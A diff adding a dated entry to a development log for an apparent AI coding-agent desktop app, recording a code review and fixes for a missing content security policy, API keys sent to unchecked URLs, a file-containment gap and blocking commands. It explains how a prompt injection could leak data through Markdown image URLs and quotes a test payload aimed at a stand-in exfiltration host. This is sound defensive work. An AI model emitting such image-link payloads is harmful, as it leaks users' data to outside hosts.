@@ -4518,3 +4518,69 @@ Verified in the native window. `workspace-b`, whose only profile is `b-only`,
 comes up on `b-only` with `deepseek-chat · low` and answers a real turn; this
 repo still comes up on its own `auto` at `medium`. Both roots were reached by
 switching, which is now a reload — so each one is a genuine start-up.
+
+## 2026-08-15 — a whole-codebase review, and the four fixes it was worth
+
+A read of everything — ~19k lines of TS/TSX and ~3k of Rust — looking for gaps
+rather than for a feature. Seven findings; four were fixed the same day and are
+below. What the review mostly confirmed is that the reasoning in this codebase
+holds: the cancel path, `object_id`, the rtk digest-before-unpack ordering,
+`under_mount`'s whole-segment matching and the gate queue were all checked and
+all stand.
+
+**The transcript could fetch a URL the model chose.** `app.security.csp` was
+`null` — the scaffold default, never revisited. Model output is drawn as
+Markdown, and `![](https://somewhere/?x=…)` is a silent outbound GET to a host
+the model picked: the channel a prompt injection reaches for once it has read
+something worth sending. `react-markdown` escapes raw HTML, so there was never a
+script hole. There was a subresource hole.
+
+The policy had to go in `index.html` as well as `tauri.conf.json`, and the
+second one is the interesting half: Tauri sets the header only on its own
+`tauri://localhost` asset protocol, and `proxy_dev_request` is
+`#[cfg(all(dev, mobile))]` — so on desktop `npm run tauri dev` the window
+navigates straight to Vite and **nothing injects it**. A config-only fix would
+have left the hole open in the one window this repo is actually driven in.
+`default-src`/`script-src`/`style-src` are deliberately absent: Monaco builds its
+themes as runtime `<style>` elements and the React plugin injects an inline
+preamble in dev, so restricting those breaks the editor and the page while
+buying nothing — the scripts are the bundle, and the bundle is not what an
+attacker writes.
+
+**An API key would go anywhere the renderer named.** `provider_stream` took
+`provider` and `url` as independent parameters and never compared them, and
+`credential_for`'s last arm was `_`, so any id at all resolved to the DeepSeek
+key. That is the hole `agent_write_file` exists to close on the file surface,
+one layer over. `Credential` now carries `host`, so a provider cannot be added
+without naming where its key travels — the same argument `CREDENTIAL_VARS` makes
+about `env_var`.
+
+**The uncapped reader made three quarters of a containment argument.**
+`read_text_lines` is allowed past 2 MiB because a session transcript grows
+without bound, and it bought that by re-implementing `resolve` and omitting the
+canonicalised `starts_with`. It now calls `resolve_within(…, None)`, so the cap
+is the only difference between them and the test says exactly that.
+
+**A workspace search held up every other command.** Synchronous Tauri commands
+are serialised: `agent_shell` answers in 2ms alone and in 583ms during a
+`search_workspace`. The window keeps painting the whole time — 38 frames in
+635ms, the same as idle — which is why it never looked like anything, and why
+the first write-up of this finding said "freezes the window" and was wrong. It
+is not a frozen UI; it is nothing else being able to answer. The three walks
+whose size is the workspace's are now `async` over `spawn_blocking`.
+
+`npm run check` also grew the two suites it never ran. It covered the 34 node
+checks and neither `tsc --noEmit` nor `cargo test`, so the entire Rust
+containment suite only ran when someone remembered.
+
+All four verified in the native window against a real model, including the
+reported channel end to end: a turn carrying `![](https://exfil.invalid/…)`
+renders the `<img>` and the browser refuses it, three `img-src` violations,
+`naturalWidth` 0. The element came from the *prompt* echo, which goes through
+the same `Markdown` component as the agent's prose — so pasted content was a
+second mouth on the same channel, and one policy closes both.
+
+One incidental correction: the directory named `----` under `.ade/sessions` was
+recorded as rtk mangling `ls` output. It is real, and it is pi's — the
+`JsonlSessionRepo` namespaces sessions by cwd, and `cwd: "/"` sanitises to that.
+The session files are inside it.
